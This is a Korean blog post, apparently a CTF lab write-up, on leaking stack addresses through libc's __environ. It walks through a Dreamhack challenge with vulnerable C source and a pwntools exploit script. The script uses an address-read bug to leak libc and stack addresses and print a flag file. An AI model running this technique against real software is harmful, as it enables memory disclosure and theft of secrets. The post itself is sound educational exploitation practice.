@@ -1,0 +1,173 @@
+<!doctype html>
+<html lang="ko" data-theme="light"><head>
+  <meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>[PWNABLE] environ stack leak · whrds.log</title><meta name="description" content="__environ을 이용한 스택 주소 leak__environ은 환경 변수 중 하나로 시스템의 정보를 갖고 있는 변수이다.(execve 계열의 함수가 참조한다.)libc파일에서 심볼을 찾을 수 있다. environ에 들어있는 값을 확인한 모습이다. 해당 부분들이 stack 영역에 속하는 것 또한 알 수 있다. 전체적인 내">
+  <meta name="theme-color" content="#f7f7f3"><link rel="canonical" href="https://whrds.github.io/ko/posts/pwnable-environ-stack-leak/">
+  <link rel="alternate" hreflang="ko" href="https://whrds.github.io/ko/posts/pwnable-environ-stack-leak/"><link rel="alternate" hreflang="en" href="https://whrds.github.io/en/posts/pwnable-environ-stack-leak/">
+  <meta property="og:type" content="article"><meta property="og:title" content="[PWNABLE] environ stack leak · whrds.log"><meta property="og:description" content="__environ을 이용한 스택 주소 leak__environ은 환경 변수 중 하나로 시스템의 정보를 갖고 있는 변수이다.(execve 계열의 함수가 참조한다.)libc파일에서 심볼을 찾을 수 있다. environ에 들어있는 값을 확인한 모습이다. 해당 부분들이 stack 영역에 속하는 것 또한 알 수 있다. 전체적인 내"><meta property="og:url" content="https://whrds.github.io/ko/posts/pwnable-environ-stack-leak/">
+  <link rel="icon" href="/assets/favicon.svg" type="image/svg+xml"><link rel="stylesheet" href="/assets/styles.css">
+  <script>try{const t=localStorage.getItem('theme');if(t)document.documentElement.dataset.theme=t;else if(matchMedia('(prefers-color-scheme:dark)').matches)document.documentElement.dataset.theme='dark'}catch(e){}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"[PWNABLE] environ stack leak","description":"__environ을 이용한 스택 주소 leak__environ은 환경 변수 중 하나로 시스템의 정보를 갖고 있는 변수이다.(execve 계열의 함수가 참조한다.)libc파일에서 심볼을 찾을 수 있다. environ에 들어있는 값을 확인한 모습이다. 해당 부분들이 stack 영역에 속하는 것 또한 알 수 있다. 전체적인 내","datePublished":"2024-06-24","inLanguage":"ko","url":"https://whrds.github.io/ko/posts/pwnable-environ-stack-leak/","author":{"@type":"Person","name":"whrds"}}</script>
+</head><body>
+  <a class="skip-link" href="#main">본문으로 건너뛰기</a>
+  <header class="site-header"><div class="shell header-inner">
+    <a class="brand" href="/ko/" aria-label="whrds.log home"><span class="brand-mark">W_</span><span class="brand-text">whrds.log</span></a>
+    <nav class="main-nav" aria-label="주 메뉴">
+      <a href="/ko/" aria-current="page">글</a>
+      <a href="/ko/about/">소개</a>
+    </nav>
+    <div class="header-tools">
+      <div class="language-switch" aria-label="Language">
+        <a href="#" class="active" lang="ko" aria-current="true">KO</a>
+        <a href="/en/posts/pwnable-environ-stack-leak/" class="" lang="en">EN</a>
+      </div>
+      <button class="icon-button" type="button" data-theme-toggle aria-label="Use dark theme">◐</button>
+    </div>
+  </div></header>
+  <main id="main"><article class="article-wrap"><header class="article-header"><p class="eyebrow">Security research notes</p><h1>[PWNABLE] environ stack leak</h1><p class="article-description">__environ을 이용한 스택 주소 leak__environ은 환경 변수 중 하나로 시스템의 정보를 갖고 있는 변수이다.(execve 계열의 함수가 참조한다.)libc파일에서 심볼을 찾을 수 있다. environ에 들어있는 값을 확인한 모습이다. 해당 부분들이 stack 영역에 속하는 것 또한 알 수 있다. 전체적인 내</p><div class="article-meta"><time datetime="2024-06-24">2024년 6월 24일</time><span>·</span><span>1 분 읽기</span></div></header><div class="prose"><h3>__environ을 이용한 스택 주소 leak</h3>
+<p>__environ은 환경 변수 중 하나로 시스템의 정보를 갖고 있는 변수이다.</p>
+<p>(execve 계열의 함수가 참조한다.)</p>
+<p><img src="/assets/images/tistory/tistory-8beaf703795a/001.png" alt=""></p>
+<p>libc파일에서 심볼을 찾을 수 있다.</p>
+<p><img src="/assets/images/tistory/tistory-8beaf703795a/002.png" alt=""></p>
+<p><img src="/assets/images/tistory/tistory-8beaf703795a/003.png" alt=""></p>
+<p>environ에 들어있는 값을 확인한 모습이다.</p>
+<p><img src="/assets/images/tistory/tistory-8beaf703795a/004.png" alt=""></p>
+<p>해당 부분들이 stack 영역에 속하는 것 또한 알 수 있다.</p>
+<p><img src="/assets/images/tistory/tistory-8beaf703795a/005.png" alt=""></p>
+<p>전체적인 내용이다.</p>
+<p><img src="/assets/images/tistory/tistory-8beaf703795a/006.png" alt=""></p>
+<p>_init()이 실행될 때 호출되어 사용되는 듯 하다.</p>
+<hr>
+<h4>dreamhack - __envirion</h4>
+<pre><code>#include &lt;fcntl.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;signal.h&gt;
+#include &lt;stdlib.h&gt;
+
+void sig_handle() {
+  exit(0);
+}
+void init() {
+  setvbuf(stdin, 0, 2, 0);
+  setvbuf(stdout, 0, 2, 0);
+
+  signal(SIGALRM, sig_handle);
+  alarm(5);
+}
+
+void read_file() {
+  char file_buf[4096];
+
+  int fd = open(&quot;./flag&quot;, O_RDONLY);
+  read(fd, file_buf, sizeof(file_buf) - 1);
+  close(fd);
+}
+int main() {
+  char buf[1024];
+  long addr;
+  int idx;
+
+  init();
+  read_file();
+
+  printf(&quot;stdout: %p\n&quot;, stdout);
+
+  while (1) {
+    printf(&quot;&gt; &quot;);
+    scanf(&quot;%d&quot;, &amp;idx);
+    switch (idx) {
+      case 1:
+        printf(&quot;Addr: &quot;);
+        scanf(&quot;%ld&quot;, &amp;addr);
+        printf(&quot;%s&quot;, (char *)addr);
+        break;
+      default:
+        break;
+    }
+  }
+  return 0;
+}
+</code></pre>
+<p>파일을 실행하면 아래와 같이 stdout 라이브러리 주소를 출력하고 있다.</p>
+<p><img src="/assets/images/tistory/tistory-8beaf703795a/007.png" alt=""></p>
+<p>그리고 반복해서 addr이라는 변수의 주소에 값을 입력한다.</p>
+<p>stdout의 주소를 leak해주었으므로 libc_base를 구할 수 있다.</p>
+<p>이를 통해 __environ까지 구할 수 있다.</p>
+<p>계속해서 addr이 가리키는 값을 출력을 해주므로 해당 주소가 ./flag를 가리키게 만들어야 한다.</p>
+<pre><code>from pwn import*
+
+p = process(['./environ'],env={'LD_PRELOAD':'./libc.so.6'})
+e = ELF('./environ')
+libc = ELF('./libc.so.6')
+
+context.log_level = 'debug'
+
+p.recvuntil(b&quot;: &quot;)
+stdout = int(p.recvn(14),16)
+
+stdout_offset = libc.sym['_IO_2_1_stdout_']
+environ_offset = libc.sym['__environ']
+
+libc_base = stdout-stdout_offset
+environ = libc_base + environ_offset
+
+print(&quot;stdout@add : &quot;,hex(stdout))
+print(&quot;libc_base@add : &quot;,hex(libc_base))
+print(&quot;environ@add : &quot;, hex(environ))
+p.interactive()
+</code></pre>
+<p>libc_base와 environ의 주소를 구하는 페이로드 초안이다.</p>
+<p>이제 flag파일을 읽는 read_file 함수를 이용하여 스택 간격을 구해야 한다.</p>
+<p><img src="/assets/images/tistory/tistory-8beaf703795a/008.png" alt=""></p>
+<p>파일을 열고 내용을 읽는 부분이다.</p>
+<p>읽을 대상이 rsi, rcx 레지스터에 들어가 있는 것을 볼 수 있다.</p>
+<p><img src="/assets/images/tistory/tistory-8beaf703795a/009.png" alt=""></p>
+<p>현재 확인된 정보이다.</p>
+<p>높은 주소에서 낮은 주소를 빼면 0x1568이라는 차이가 나온다.</p>
+<p><img src="/assets/images/tistory/tistory-8beaf703795a/010.png" alt=""></p>
+<p>먼저 구한 environ의 주소에 들어있는 값을 leak하고,</p>
+<p>rsi에 있는 주소를 가리키 설정해주어야 한다.</p>
+<p>그렇게 수정한 코드이다.</p>
+<pre><code>from pwn import*
+
+p = process(['./environ'],env={'LD_PRELOAD':'./libc.so.6'})
+e = ELF('./environ')
+libc = ELF('./libc.so.6')
+
+context.log_level = 'debug'
+
+p.recvuntil(b&quot;: &quot;)
+stdout = int(p.recvn(14),16)
+
+stdout_offset = libc.sym['_IO_2_1_stdout_']
+environ_offset = libc.sym['__environ']
+
+libc_base = stdout-stdout_offset
+environ = libc_base + environ_offset
+
+print(&quot;stdout@add : &quot;,hex(stdout))
+print(&quot;libc_base@add : &quot;,hex(libc_base))
+print(&quot;environ@add : &quot;, hex(environ))
+
+p.sendlineafter(b&quot;&gt;&quot;,b&quot;1&quot;)
+p.sendlineafter(b&quot;:&quot;,str(environ))
+p.recvuntil('\x20')
+
+environ_val = u64(p.recvn(6).ljust(8,b'\x00'))
+print(&quot;environ_val : &quot;,hex(environ_val))
+
+flag_add = environ_val - 0x1568
+print(&quot;flag_add : &quot;,flag_add)
+
+p.sendlineafter(b&quot;&gt;&quot;,b&quot;1&quot;)
+p.sendlineafter(b&quot;:&quot;,str(flag_add))
+p.interactive()
+</code></pre>
+<p><img src="/assets/images/tistory/tistory-8beaf703795a/011.png" alt=""></p>
+<p>실행하면 flag가 출력되는 것을 볼 수 있다.</p>
+</div><div class="article-end"><a href="/ko/">← 모든 글 보기</a><a href="/en/posts/pwnable-environ-stack-leak/" hreflang="en">이 글을 영어로 읽기 →</a></div></article></main>
+  <footer class="site-footer"><div class="shell footer-inner"><span>© 2026 whrds</span><span>관찰하고, 검증하고, 기록합니다.</span><a href="/ko/feed.xml">RSS</a></div></footer>
+  <script src="/assets/app.js" defer></script>
+</body></html>
